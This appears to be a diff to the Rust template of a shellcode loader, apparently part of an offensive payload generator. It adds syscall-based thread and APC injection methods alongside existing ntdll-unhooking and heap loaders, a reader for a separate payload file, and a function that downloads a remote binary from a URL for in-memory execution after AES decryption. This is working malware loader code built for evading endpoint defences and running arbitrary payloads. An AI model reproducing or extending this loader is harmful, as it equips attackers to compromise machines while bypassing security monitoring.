@@ -6,6 +6,7 @@ use winapi::um::handleapi::CloseHandle;
 use winapi::um::synchapi::WaitForSingleObject;
 use winapi::um::winbase::INFINITE;
 use windows::Win32::Foundation::HANDLE;
+use std::fs;
 
 const NATIVE: bool = {NATIVE};
 const DLL_NAME: &str = r"{DLL_NAME}";
@@ -120,6 +121,10 @@ extern "C" {
         iv: *const u8,
         iv_len: usize,
     ) -> DecryptResult;
+    
+
+    pub fn create_local_thread_syscall_run(code: *const u8, code_len: usize);
+    pub fn queue_apc_thread_syscall_run(code: *const u8, code_len: usize);
     pub fn ntdll_unhook_loader_run(code: *const u8, code_len: usize);
     pub fn heapapi_dynamic_loader_run(code: *const u8, code_len: usize);
     pub fn nt_queue_apc_thread_ex_local_run(code: *const u8, code_len: usize);
@@ -128,10 +133,11 @@ extern "C" {
     pub fn get_remote_bin(url: *const c_char, out_len: *mut usize) -> *mut u8;
     }
 
+
 fn payload_execution() {
     
         unsafe {
-  
+            
             const AES_KEY: [u8; 16] = {AES_KEY};
             const AES_IV: [u8; 16] = {AES_IV};
             #[cfg(feature = "remote")]
@@ -154,6 +160,25 @@ fn payload_execution() {
             std::thread::sleep(std::time::Duration::from_millis(100));
             {LOAD_METHOD}_run(pt.data_ptr, pt.data_len);
         }
-    
 }
 
+#[cfg(feature = "separate")]
+pub fn read_file(file_name: &str) -> Vec<u8> {
+    match fs::read(file_name) {
+        Ok(buffer) => {
+            buffer
+        }
+        Err(e) => {
+            Vec::new()
+        }
+    }
+}
+
+
+#[cfg(feature = "remote")]
+fn get_data_from_url(url: &str) -> Vec<u8> {
+    let c_url = CString::new(url).unwrap();
+    let mut length: usize = 0;
+    let data_ptr = unsafe {{get_remote_bin(c_url.as_ptr(), &mut length as *mut usize) }};
+    unsafe {{ Vec::from_raw_parts(data_ptr, length, length) }}
+}
